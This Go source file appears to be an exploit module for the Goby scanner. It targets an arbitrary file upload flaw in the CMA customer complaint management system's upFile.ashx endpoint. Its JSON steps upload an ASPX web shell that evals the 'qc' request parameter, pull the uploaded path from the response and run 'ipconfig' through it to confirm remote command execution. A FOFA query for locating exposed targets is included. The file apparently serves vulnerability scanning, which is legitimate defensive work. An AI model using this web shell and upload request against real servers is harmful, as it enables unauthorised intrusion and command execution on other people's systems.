package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "CMA客诉管理系统 upFile.ashx 任意文件上传漏洞",
  "Description": "",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": "2023-03-22",
  "Author": "清晨",
  "FofaQuery": "title=\"CMA客诉管理系统手机端\"",
  "GobyQuery": "title=\"CMA客诉管理系统手机端\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/upFile/upFile.ashx",
        "follow_redirect": true,
        "header": {
          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymXf9pBIUlDVOYtnZ"
        },
        "data_type": "text",
        "data": "------WebKitFormBoundarymXf9pBIUlDVOYtnZ\nContent-Disposition: form-data; name=\"file\"; filename=\"abcdef.aspx\"\nContent-Type: application/octet-stream\n\n<% @Page Language=\"Jscript\"%><%eval(Request.Item[\"qc\"],\"unsafe\");%>\n\n------WebKitFormBoundarymXf9pBIUlDVOYtnZ--"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "\"path\":",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "path|lastbody|regex|\"path\":\"/(.*)\""
      ]
    },
    {
      "Request": {
        "method": "GET",
        "uri": "{{{path}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": "qc=ipconfig"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "Windows IP",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "{{{path}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": "qc=ipconfig"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "IPv4",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "CMA客诉管理系统 upFile.ashx 任意文件上传漏洞",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "CMA upload file",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}